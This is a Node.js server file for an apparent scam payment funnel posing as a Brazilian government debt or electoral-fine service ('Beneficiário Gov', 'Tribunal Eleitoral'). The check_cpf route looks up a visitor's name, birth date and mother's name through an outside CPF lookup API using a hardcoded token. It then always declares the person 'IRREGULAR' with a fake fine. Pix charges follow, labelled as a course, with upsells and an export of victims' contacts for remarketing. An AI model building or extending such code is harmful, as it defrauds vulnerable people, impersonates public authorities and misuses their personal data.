const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
let QRCode = null;
try {
  QRCode = require('qrcode');
} catch(e) {}
const adminService = require('./lib/adminService');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;

const FREEPAY_CONFIG = {
  BASE_URL: process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com',
  PUBLIC_KEY: process.env.FREEPAY_PUBLIC_KEY || '',
  SECRET_KEY: process.env.FREEPAY_SECRET_KEY || ''
};

const configPath = path.join(__dirname, 'freepay_config.json');
if (fs.existsSync(configPath)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    FREEPAY_CONFIG.PUBLIC_KEY = loaded.PUBLIC_KEY || FREEPAY_CONFIG.PUBLIC_KEY;
    FREEPAY_CONFIG.SECRET_KEY = loaded.SECRET_KEY || FREEPAY_CONFIG.SECRET_KEY;
    if (loaded.BASE_URL) FREEPAY_CONFIG.BASE_URL = loaded.BASE_URL;
  } catch(e) {}
}

function getFreePayAuthHeader() {
  const gwConfig = adminService.getGatewayConfig();
  const dbGw = gwConfig.gateways.find(g => g.key === 'freepay');
  const pub = FREEPAY_CONFIG.PUBLIC_KEY || (dbGw ? dbGw.publicKey : '');
  const sec = FREEPAY_CONFIG.SECRET_KEY || (dbGw ? dbGw.secretKey : '');

  if (!pub || !sec) return null;
  const token = Buffer.from(`${pub}:${sec}`).toString('base64');
  return `Basic ${token}`;
}

async function generateQRCodeDataURL(text) {
  try {
    if (QRCode && typeof QRCode.toDataURL === 'function') {
      return await QRCode.toDataURL(text, {
        width: 280,
        margin: 1,
        color: { dark: '#000000', light: '#ffffff' }
      });
    }
    return `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(text)}`;
  } catch(e) {
    return '';
  }
}

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.mp3': 'audio/mpeg',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
  '.wav': 'audio/wav',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject'
};

const transactions = new Map();

function generatePixPayload(amount, identifier, name = 'DESENROLA BRASIL') {
  const formattedAmount = Number(amount).toFixed(2);
  return `00020126580014br.gov.bcb.pix0136${identifier || 'a7b8c9d0-1234-5678-90ab-cdef12345678'}520400005303986540${formattedAmount.length.toString().padStart(2, '0')}${formattedAmount}5802BR59${name.length.toString().padStart(2, '0')}${name}6008BRASILIA62070503***6304ABCD`;
}

const firstNames = ['Carlos', 'Maria', 'Jose', 'Ana', 'Paulo', 'Juliana', 'Marcos', 'Fernanda', 'Lucas', 'Patricia', 'Gabriel', 'Beatriz'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro'];

function generateNameFromCPF(cpfDigits) {
  const n1 = parseInt(cpfDigits.slice(0, 3), 10) || 0;
  const n2 = parseInt(cpfDigits.slice(3, 6), 10) || 0;
  const n3 = parseInt(cpfDigits.slice(6, 9), 10) || 0;
  return `${firstNames[n1 % firstNames.length]} ${lastNames[n2 % lastNames.length]} ${lastNames[n3 % lastNames.length]}`;
}

async function createFreePayTransaction({ amount, name, cpf, phone, email, title }) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    payment_method: 'pix',
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      document: { number: cleanCpf, type: 'cpf' },
      phone: cleanPhone
    },
    items: [
      {
        title: 'Curso MoneyClub',
        unit_price: amountCents,
        quantity: 1,
        tangible: false
      }
    ],
    metadata: {
      order_id: 'ORD_' + Date.now(),
      cpf: cleanCpf
    },
    pix: { expires_in_days: 1 }
  };

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    return await res.json();
  } catch (err) {
    return null;
  }
}

async function checkFreePayStatus(transactionId) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/info/${transactionId}`, {
      method: 'GET',
      headers: { 'Authorization': authHeader }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}



// Universal Gateway Dispatcher delegated to adminService
async function createUniversalTransaction(params) {
  return await adminService.createUniversalTransaction(params);
}

const handler = async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/+$/, '') || '/';
  const method = req.method;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Helper to read JSON body
  const readJsonBody = () => new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(body || '{}')); } catch(e) { resolve({}); }
    });
  });

  // Helper for admin auth middleware
  const getAuthToken = () => {
    const auth = req.headers['authorization'] || '';
    if (auth.startsWith('Bearer ')) return auth.slice(7);
    const cookies = req.headers['cookie'] || '';
    const match = cookies.match(/recupera_admin_token=([^;]+)/);
    return match ? match[1] : null;
  };

  // ==========================================
  // ADMIN API ROUTES (/api/admin/*)
  // ==========================================
  
  // Public Pixels endpoint for funnels & tracking
  if (pathname === '/api/pixels/public' && method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(adminService.getPixels()));
    return;
  }

  if (pathname.startsWith('/api/admin/')) {
    // 1. Auth Login
    if (pathname === '/api/admin/auth/login' && method === 'POST') {
      const body = await readJsonBody();
      const result = adminService.loginAdmin(body.username, body.password);
      if (result.success) {
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Set-Cookie': `recupera_admin_token=${result.token}; Path=/; HttpOnly; Max-Age=28800`
        });
      } else {
        res.writeHead(401, { 'Content-Type': 'application/json' });
      }
      res.end(JSON.stringify(result));
      return;
    }

    // 2. Auth Logout
    if (pathname === '/api/admin/auth/logout' && method === 'POST') {
      const token = getAuthToken();
      const result = adminService.logoutAdmin(token);
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Set-Cookie': 'recupera_admin_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
      });
      res.end(JSON.stringify(result));
      return;
    }

    // Auth Middleware for all other /api/admin/* routes
    const token = getAuthToken();
    const session = adminService.validateSession(token);
    if (!session) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Sessão expirada ou não autorizada.' }));
      return;
    }

    // 3. Auth Me
    if (pathname === '/api/admin/auth/me' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        user: { username: session.username, role: 'Administrador', brand: 'RecuperaBrasil' }
      }));
      return;
    }

    // 4. Gateway Config
    if (pathname === '/api/admin/gateway-config' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getGatewayConfig()));
      return;
    }

    if (pathname === '/api/admin/gateway-config' && method === 'PUT') {
      const body = await readJsonBody();
      const result = adminService.updateGatewayConfig(body);
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // 5. Gateway Test & Activate
    if (pathname === '/api/admin/gateway-test' && method === 'POST') {
      const body = await readJsonBody();
      const result = await adminService.testAndActivateGateway(body);
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    
    // Pixels Management
    if (pathname === '/api/admin/pixels' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getPixels()));
      return;
    }

    if (pathname === '/api/admin/pixels' && method === 'POST') {
      const body = await readJsonBody();
      const result = adminService.savePixels(body);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // 6. Offers & Pixels
    if (pathname === '/api/admin/offers' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getOffers()));
      return;
    }

    if (pathname === '/api/admin/offers' && method === 'POST') {
      const body = await readJsonBody();
      try {
        const result = adminService.saveOffer(body);
        res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
      return;
    }

    if (pathname.startsWith('/api/admin/offers/') && method === 'DELETE') {
      const offerId = pathname.replace('/api/admin/offers/', '');
      const result = adminService.deleteOffer(offerId);
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // 7. Orders
    if (pathname === '/api/admin/orders' && method === 'GET') {
      const result = await adminService.getOrders(parsedUrl.query);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // Export de contatos (nome, telefone, email) por status - para remarketing
    if (pathname === '/api/admin/orders/export' && method === 'GET') {
      const statusFilter = parsedUrl.query.status || 'ALL';
      const result = await adminService.getOrders({ status: statusFilter });
      const csv = adminService.ordersToCsv(result.orders || []);
      res.writeHead(200, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="pedidos_${statusFilter.toLowerCase()}_${Date.now()}.csv"`
      });
      res.end('﻿' + csv);
      return;
    }

    if (pathname.startsWith('/api/admin/orders/') && method === 'GET') {
      const orderId = pathname.replace('/api/admin/orders/', '');
      const result = adminService.getOrderById(orderId);
      res.writeHead(result.success ? 200 : 404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // 8. Metrics & Retention
    // 9. Utmify API Tokens & Multi-Account Test
    if (pathname === '/api/admin/utmify-token' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, tokens: adminService.getUtmifyApiTokens() }));
      return;
    }

    if (pathname === '/api/admin/utmify-token' && method === 'POST') {
      const body = await readJsonBody();
      const result = adminService.updateUtmifyApiTokens(body.tokens || body.token);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/utmify/test' && method === 'POST') {
      const body = await readJsonBody();
      if (body.tokens || body.token) adminService.updateUtmifyApiTokens(body.tokens || body.token);
      const testRes = await adminService.sendUtmifyOrderWebhook({
        orderId: 'TEST_ADM_' + Date.now(),
        status: body.status || 'paid',
        amount: 68.92,
        customer: {
          name: 'Teste Multi-Token Utmify',
          email: 'teste@cliente.com',
          document: '08072703188',
          phone: '11999999999'
        },
        tracking: { utm_source: 'admin_test' },
        isTest: true
      });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: testRes.success,
        details: testRes,
        message: testRes.success
          ? (`✓ Token(s) validado(s) com sucesso em ` + testRes.successfulCount + ` conta(s) Utmify (HTTP 200 OK). Este é um pedido de TESTE: a própria Utmify valida mas não salva pedidos de teste, então ele não vai aparecer no seu painel/resumo da Utmify - isso é esperado. Os webhooks reais (pendente/aprovada) são enviados normalmente quando um cliente gera ou paga um Pix de verdade.`)
          : 'Falha ao validar com a Utmify'
      }));
      return;
    }

    if (pathname === '/api/admin/metrics' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(await adminService.getMetrics()));
      return;
    }

    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Endpoint administrativo não encontrado' }));
    return;
  }

  // ==========================================
  // CLIENT FUNNEL API ROUTES
  // ==========================================

  
async function fetchCpfData(rawCpf) {
  const token = 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93';
  const url = `https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${rawCpf}&token=${token}`;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 6000);
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (data && data.nome) {
        return {
          cpf: data.cpf || rawCpf,
          nome: data.nome.trim(),
          nascimento: data.nascimento ? data.nascimento.trim() : '19/05/2003',
          mae: data.mae ? data.mae.trim() : '',
          sexo: data.sexo || 'M'
        };
      }
    }
  } catch (err) {
    console.error('Error fetching ZapGroup CPF data:', err.message);
  }
  return null;
}

  // Marca que o cliente copiou o código PIX (usado para remarketing)
  if (pathname === '/api/pix-copied' && method === 'POST') {
    const body = await readJsonBody();
    const txId = body.transactionId || body.orderId || body.gatewayId;
    if (txId) adminService.markPixCopied(txId);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  // 1. CPF Verification
  if (pathname === '/api/check_cpf' && method === 'POST') {
    const body = await readJsonBody();
    const rawCpf = (body.cpf || '').replace(/\D/g, '');
    if (rawCpf.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
      return;
    }

    adminService.recordSessionEvent('consulta');

    const externalData = await fetchCpfData(rawCpf);
    const finalNome = externalData?.nome || generateNameFromCPF(rawCpf);
    const finalNascimento = externalData?.nascimento || '19/05/2003';
    const finalSexo = externalData?.sexo || 'M';

    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
    });
    res.end(JSON.stringify({
      success: true,
      cpf: rawCpf,
      nome: finalNome,
      nascimento: finalNascimento,
      sexo: finalSexo,
      mae: externalData?.mae || '',
      status: 'IRREGULAR',
      multa: 419.55,
      desconto: 57.97
    }));
    return;
  }

  // 2. Generate PIX (Main Attendance / Chat - R$ 57,97)
  if (pathname === '/generate-pix' && method === 'POST') {
    const clientData = await readJsonBody();
    const amount = 57.97;
    adminService.recordSessionEvent('identidade');

    const result = await createUniversalTransaction({
      amount: amount,
      name: clientData.nome,
      cpf: clientData.cpf,
      phone: clientData.telefone || clientData.phone,
      email: clientData.email,
      title: 'Curso MoneyClub'
    });

    transactions.set(result.transactionId, { createdAt: Date.now(), gateway: result.gatewayKey, id: result.transactionId, name: clientData.nome, cpf: clientData.cpf, phone: clientData.telefone || clientData.phone, email: clientData.email, amount: amount });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: clientData.nome || 'Beneficiário Gov',
      email: clientData.email || `cliente_${(clientData.cpf||'').replace(/\D/g,'')}@email.com`,
      cpf: clientData.cpf,
      phone: clientData.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'Curso MoneyClub'
    });

    // Envia Webhook de Venda Pendente para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      },
      tracking: {
        utm_source: clientData.utm_source,
        utm_medium: clientData.utm_medium,
        utm_campaign: clientData.utm_campaign,
        utm_content: clientData.utm_content,
        utm_term: clientData.utm_term,
        src: clientData.src,
        sck: clientData.sck
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      pixQrCode: result.pixQrCode,
      qr_code_base64: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  // 3. Generate PIX Upsell (R$ 54,92)
  if (pathname === '/generate-pix-upsell' && method === 'POST') {
    const clientData = await readJsonBody();
    const amount = 54.92;
    adminService.recordSessionEvent('recebimento');

    const result = await createUniversalTransaction({
      amount: amount,
      name: clientData.nome,
      cpf: clientData.cpf,
      phone: clientData.telefone || clientData.phone,
      email: clientData.email,
      title: 'Curso MoneyClub'
    });

    transactions.set(result.transactionId, { createdAt: Date.now(), gateway: result.gatewayKey, id: result.transactionId, name: clientData.nome, cpf: clientData.cpf, phone: clientData.telefone || clientData.phone, email: clientData.email, amount: amount });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: clientData.nome || 'Beneficiário Gov',
      email: clientData.email || 'cliente@email.com',
      cpf: clientData.cpf,
      phone: clientData.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'Curso MoneyClub'
    });

    // Envia Webhook de Venda Pendente do Upsell 1 para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      },
      tracking: {
        utm_source: clientData.utm_source,
        utm_medium: clientData.utm_medium,
        utm_campaign: clientData.utm_campaign,
        utm_content: clientData.utm_content,
        utm_term: clientData.utm_term,
        src: clientData.src,
        sck: clientData.sck
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      qr_code_base64: result.pixQrCode,
      pixQrCode: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  // 4. Generate PIX Multa (R$ 67,35)
  if (pathname === '/generate-pix-multa' && method === 'POST') {
    const clientData = await readJsonBody();
    const amount = 67.35;
    adminService.recordSessionEvent('recebimento');

    const result = await createUniversalTransaction({
      amount: amount,
      name: clientData.nome,
      cpf: clientData.cpf,
      phone: clientData.telefone || clientData.phone,
      email: clientData.email,
      title: 'Regularização Multa Adicional - Tribunal Eleitoral'
    });

    transactions.set(result.transactionId, { createdAt: Date.now(), gateway: result.gatewayKey, id: result.transactionId, name: clientData.nome, cpf: clientData.cpf, phone: clientData.telefone || clientData.phone, email: clientData.email, amount: amount });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: clientData.nome || 'Beneficiário Gov',
      email: clientData.email || 'cliente@email.com',
      cpf: clientData.cpf,
      phone: clientData.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'Curso MoneyClub'
    });

    // Envia Webhook de Venda Pendente para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: clientData.nome,
        email: clientData.email,
        document: clientData.cpf,
        phone: clientData.telefone || clientData.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      qr_code_base64: result.pixQrCode,
      pixQrCode: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  // 5. Generate QR Code Image
  if (pathname === '/generate-qrcode' && method === 'GET') {
    const dataText = parsedUrl.query.data || 'PIX_CODE_PLACEHOLDER';
    QRCode.toBuffer(dataText, { width: 280, margin: 1, type: 'png' }, (err, buffer) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Error generating QR Code');
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'image/png',
        'Cache-Control': 'public, max-age=86400'
      });
      res.end(buffer);
    });
    return;
  }

  // 6. Payment Monitoring Endpoint (Supports FreePay, BlackCat, FlevoPay, PinguPag)
  if (pathname.startsWith('/check-payment/')) {
    const gatewayId = pathname.replace('/check-payment/', '');
    const tx = transactions.get(gatewayId);

    const notifyPaymentPaid = async (gwId, sourceTx) => {
      adminService.updateOrderStatus(gwId, 'PAID');
      const orderObj = adminService.getOrderById(gwId)?.order || sourceTx;
      const amt = orderObj?.amount || sourceTx?.amount || 57.97;
      const cust = {
        name: orderObj?.clientName || sourceTx?.name || 'Beneficiário Gov',
        email: orderObj?.email || sourceTx?.email || 'cliente@email.com',
        document: orderObj?.cpf || sourceTx?.cpf || '08072703188',
        phone: orderObj?.phone || sourceTx?.phone || '11999999999'
      };
      await Promise.allSettled([
        adminService.sendUtmifyOrderWebhook({
          orderId: gwId,
          status: 'paid',
          amount: amt,
          customer: cust
        }),
        adminService.sendFacebookCapiEvent({
          eventName: 'Purchase',
          orderId: gwId,
          amount: amt,
          customer: cust
        }),
        adminService.sendTikTokEventsApi({
          eventName: 'Purchase',
          orderId: gwId,
          amount: amt,
          customer: cust
        })
      ]);
    };

    // 1. BlackCat status
    if (gatewayId.startsWith('TXN-') || (tx && tx.gateway === 'blackcat')) {
      const bcData = await adminService.checkBlackCatStatus(gatewayId);
      if (bcData && bcData.success && bcData.data) {
        const itemStatus = (bcData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        if (isPaid) await notifyPaymentPaid(gatewayId, tx);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    // 2. FlevoPay status
    // Real FlevoPay transaction ids look like "FLESCD14N9P" (always start with
    // "FLE") - they never actually carry the "FLEVO_" prefix, that only happened
    // in a fallback id we generate ourselves if the API response were ever
    // missing both transaction_id and id. Matching just "FLEVO_" here meant this
    // branch never matched a real FlevoPay id and payment confirmation silently
    // never fired for the active gateway.
    if (gatewayId.startsWith('FLE') || (tx && tx.gateway === 'flevopay')) {
      const flevoData = await adminService.checkFlevoPayStatus(gatewayId);
      if (flevoData) {
        const rawSt = (flevoData.status || '').toLowerCase();
        const isPaid = rawSt === 'approved' || rawSt === 'paid' || rawSt === 'completed';
        if (isPaid) await notifyPaymentPaid(gatewayId, tx);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: flevoData.status,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    // 3. PinguPag status
    if (gatewayId.startsWith('PINGU_') || (tx && tx.gateway === 'pingupag')) {
      const pinguData = await adminService.checkPinguPagStatus(gatewayId);
      if (pinguData && pinguData.status) {
        const rawSt = (pinguData.status || '').toLowerCase();
        const isPaid = rawSt === 'approved' || rawSt === 'paid' || rawSt === 'completed';
        if (isPaid) await notifyPaymentPaid(gatewayId, tx);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: pinguData.status,
          gateway_id: gatewayId
        }));
        return;
      }
    }
    
    // 4. FreePay status
    if (gatewayId.length > 20 || (tx && (tx.isFreePay || tx.gateway === 'freepay'))) {
      const freePayData = await checkFreePayStatus(gatewayId);
      if (freePayData && freePayData.success && freePayData.data) {
        const itemStatus = (freePayData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        if (isPaid) await notifyPaymentPaid(gatewayId, tx);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      status: 'pending',
      gateway_id: gatewayId,
      message: 'Aguardando pagamento'
    }));
    return;
  }

  // --- Static Page Routing ---
  let filePath = '';
  if (pathname === '/' || pathname === '/pre') {
    filePath = path.join(PUBLIC_DIR, 'pre', 'index.html');
  } else if (pathname === '/admin') {
    filePath = path.join(PUBLIC_DIR, 'admin', 'index.html');
  } else if (pathname === '/cpf') {
    filePath = path.join(PUBLIC_DIR, 'cpf', 'index.html');
  } else if (pathname === '/atendimento') {
    filePath = path.join(PUBLIC_DIR, 'atendimento', 'index.html');
  } else if (pathname === '/busca') {
    filePath = path.join(PUBLIC_DIR, 'busca', 'index.html');
  } else if (pathname === '/consulta') {
    filePath = path.join(PUBLIC_DIR, 'consulta', 'index.html');
  } else if (pathname === '/chat') {
    filePath = path.join(PUBLIC_DIR, 'chat', 'index.html');
  } else if (pathname === '/negociacao') {
    filePath = path.join(PUBLIC_DIR, 'negociacao', 'index.html');
  } else if (pathname === '/upsell1') {
    filePath = path.join(PUBLIC_DIR, 'upsell1', 'index.html');
  } else if (pathname === '/upsell2') {
    filePath = path.join(PUBLIC_DIR, 'upsell1', 'index.html');
  } else if (/^\/\d{11}$/.test(pathname)) {
    filePath = path.join(PUBLIC_DIR, 'atendimento', 'index.html');
  } else {
    const relPath = pathname.startsWith('/') ? pathname.slice(1) : pathname;
    filePath = path.join(PUBLIC_DIR, relPath);
  }

  fs.stat(filePath, (err, stats) => {
    if (err) {
      const indexPath = path.join(filePath, 'index.html');
      if (fs.existsSync(indexPath)) {
        filePath = indexPath;
      } else {
        res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end('<h1>404 Not Found</h1>');
        return;
      }
    } else if (stats.isDirectory()) {
      filePath = path.join(filePath, 'index.html');
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    const range = req.headers.range;
    if ((ext === '.mp4' || ext === '.webm' || ext === '.mp3') && range) {
      fs.stat(filePath, (statErr, fileStats) => {
        if (statErr) {
          res.writeHead(404);
          res.end();
          return;
        }

        const total = fileStats.size;
        const parts = range.replace(/bytes=/, "").split("-");
        const partialstart = parts[0];
        const partialend = parts[1];

        const start = parseInt(partialstart, 10);
        const end = partialend ? parseInt(partialend, 10) : total - 1;
        const chunksize = (end - start) + 1;

        const file = fs.createReadStream(filePath, { start: start, end: end });
        res.writeHead(206, {
          'Content-Range': 'bytes ' + start + '-' + end + '/' + total,
          'Accept-Ranges': 'bytes',
          'Content-Length': chunksize,
          'Content-Type': contentType
